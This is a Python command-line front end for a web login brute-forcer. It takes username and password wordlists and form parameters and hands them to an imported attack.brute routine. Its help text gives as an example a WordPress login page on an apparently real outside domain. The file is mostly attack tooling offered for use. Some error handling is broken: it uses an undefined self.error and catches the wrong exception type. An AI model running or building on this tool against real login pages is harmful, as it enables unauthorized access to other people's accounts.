import argparse
import attack


class LoginBrute:

    def __init__(self, ):
        print("#########################################\n\n")
        params = self.get_parameters(self.get_args())
        attack.brute(params)

    def get_args(self):
        parser = argparse.ArgumentParser()

        parser.add_argument('-U', '--user', type=str, help='specify the user name for the login')
        parser.add_argument('-u', '--userList', type=str, help='specify the wordlist for the username')
        parser.add_argument('-P', '--password', type=str, help='specify the password for the login')
        parser.add_argument('-p', '--passList', type=str, help='specify the wordlist for the password')
        parser.add_argument('-d', '--data', type=str,
                            help='specify the parameters, '
                                 'Ex: username=log@password=pwd@submit=submit@action=https://alqlambara.com/wp-login.php@method=post')
        parser.add_argument('-l', '--url', type=str, help='specify the url to the form', required=True)
        parser.add_argument('-t', '--failTxt', type=str, help='provide a text that appears when login fails')

        return parser.parse_args()

    def get_parameters(self, args):

        username, user_list = args.user, args.userList
        password, pass_list = args.password, args.passList
        data, url, fail_text = args.data, args.url, args.failTxt

        if pass_list:
            try:
                pass_list = open(pass_list, 'rb').readlines()
            except IOError as e:
                print('File' + pass_list + ' not found')

        if user_list:
            try:
                user_list = open(user_list, 'rb').readlines()
            except IOError as e:
                print('File' + user_list + 'not found')

        if not user_list and not username:
            username = 'test'

        if not pass_list and not password:
            password = 'test'

        if data:
            if 'username' not in data or 'password' not in data or 'method' not in data or 'submit' not in data or 'action' not in data:
                print(self.error + 'invalid html parameters input\n')
                exit(1)
            try:
                user_param, password_param, submit, action, method = data.split('@')
                i = user_param.rfind('=') + 1
                user_param = user_param[i:len(user_param)]
                i = password_param.rfind('=') + 1
                password_param = password_param[i:len(password_param)]
                i = submit.rfind('=') + 1
                submit = submit[i:len(submit)]
                i = action.rfind('=') + 1
                action = action[i:len(action)]
                i = method.rfind('=') + 1
                method = method[i:len(method)]
            except IOError as e:
                print(self.error + 'invalid html parameters input\n')
                exit(1)
        else:
            import params_scraper
            user_param, password_param, submit, action, method = params_scraper.get_source(url)

        if 'http' not in action:
            if action[0] == '/':
                url = url + action[1:len(action)]
            else:
                ind = url.rfind('/')
                url = url[0 : ind+1]
                url = url+ action
        else:
            url = action



        print(user_param, password_param, submit, action, method, url)

        return {
            'username': username,
            'user_list': user_list,
            'password': password,
            'password_list': pass_list,
            'user_param': user_param,
            'password_param': password_param,
            'method': method,
            'url': url,
            'fail_text': fail_text,
            'action': action
        }


LoginBrute()
